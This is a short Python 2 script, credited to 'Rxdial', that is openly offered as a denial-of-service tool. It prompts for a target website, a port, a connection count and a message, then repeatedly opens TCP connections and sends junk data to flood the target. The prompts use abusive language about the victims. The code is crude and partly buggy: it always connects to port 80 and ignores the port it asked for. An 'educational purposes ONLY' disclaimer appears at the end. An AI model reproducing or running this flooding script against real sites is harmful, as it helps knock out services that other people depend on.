#!/usr/bin/python


#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
# Rxdial's simple python DDoS Script
# Infinit3
# Using Python 2.7.5
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



import socket
import time

address = (raw_input("Please enter the website you wish to DDoS ~~~~>   "))
port = int(input("Please enter the port ~~~~>   "))
ip = socket.gethostbyname( address )
conns = int(input("Enter the amount of connections you wish to make ~~~~>   "))
junk = (raw_input("Enter the message you want these whores to see ~~~~>   "))
print "Allright. We are initializing the boxes of crap you wish to make them drown in."
print "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
time.sleep(5)

def dos():
    """ This function is the one that sends all the crap their way """
    ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        ddos.connect((address, 80))
    except socket.error, msg:
        print "Failure to connect to host."
    ddos.send(junk)
    ddos.sendto(junk, (ip, port))
    ddos.send(junk)
    ddos.close()
    
for i in range(1, conns):
    dos()
print "We have completed our task, sir."
   
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
# For educational purposes ONLY
# Give credit to creator: Rxdial
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~